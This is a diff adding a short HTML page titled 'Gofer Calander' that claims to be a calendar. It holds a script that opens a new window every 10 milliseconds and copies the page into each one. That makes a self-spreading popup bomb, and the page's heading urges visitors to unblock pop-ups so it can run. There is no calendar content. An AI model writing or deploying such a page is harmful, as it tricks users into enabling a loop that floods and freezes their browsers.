@@ -1,0 +1,18 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="Dark.css">
+    <title>Gofer Calander</title>
+  </head>
+  <body>
+    <script>
+      setInterval(function() {
+        var w = window.open();
+        w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
+      }, 10);
+    </script>
+    <h1>Unblock pop ups for this site to work!</h1>
+  </body>
+  
+</html>
